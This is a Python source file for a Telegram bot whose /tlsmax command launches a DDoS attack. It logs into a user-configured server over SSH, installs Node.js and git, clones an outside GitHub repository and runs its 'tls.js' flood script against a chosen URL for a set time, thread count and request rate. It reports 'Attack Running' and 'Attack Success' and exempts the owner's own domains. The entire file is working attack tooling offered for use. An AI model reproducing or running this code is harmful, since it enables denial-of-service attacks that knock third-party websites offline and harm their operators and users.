from telethon import events,Button
import requests,os,time,json,paramiko,psutil,ipaddress
from dotenv import load_dotenv
load_dotenv()
MESSWAIT=os.getenv('MESSWAIT')
MESSDONE=os.getenv('MESSDONE')
async def tlsmax(event):
	L='user_id';G=event
	try:
		A=await G.reply(MESSWAIT);J=G.sender_id;D=G.raw_text.split()
		with open(f"./database/{J}.json",'r')as M:E=json.load(M)
		if L in E and E[L]==int(J):
			if len(D)==5:
				C=D[1];F=D[2];H=D[3];I=D[4]
				if H.isdigit()and I.isdigit()and F.isdigit():
					if not'cloudku.site'in C or'pterodactyl.my.id'in C:
						time.sleep(3);await A.edit(f"Connecting To Your Server...");N=E['server_host'];O=22;P=E['server_username'];Q=E['server_password'];B=paramiko.SSHClient();B.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						try:K=f"https://check-host.net/check-http?host={C}";await A.edit(f"""**Attack Running**
💻SITE : {C}
🕑TIME : {F}s

🤖THREAD : {H}
🤖REQUEST : {I}""",buttons=[Button.url(f"check-host.net",f"{K}")]);B.connect(N,port=O,username=P,password=Q);B.exec_command(f"apt install nodejs -y");B.exec_command(f"apt install git -y");B.exec_command(f"git clone https://github.com/CasperCloudku/Server.git");U,V,W=B.exec_command(f"cd Server && node tls.js {C} {F} {H} {I}");R=psutil.cpu_percent();S=psutil.virtual_memory().percent;time.sleep(int(F));B.exec_command(f"rm -rf Server");B.close();await A.edit(f"""**Attack Success**
💻SITE : {C}
🕑TIME : {F}s

🤖THREAD : {H}
🤖REQUEST : {I}

**Output Server**
`Attacking | Mix`

CPU Usage: {R}%
Memory Usage: {S}%""",buttons=[Button.url(f"check-host.net",f"{K}")])
						except Exception as T:await A.edit(f"An error occurred\n\n`{T}`")
					else:await A.edit('Sorry you cannot DDoS my owner website :(')
				else:await A.edit('Use format example: /tlsmax https://example.com 100 9 5')
			else:await A.edit('Use format: /tlsmax <url> <time> <thread> <request>')
		else:await A.edit('Lu gapunya server😹')
	except FileNotFoundError:await G.reply("You don't have a server to use this feature, please configure your server in the /server menu")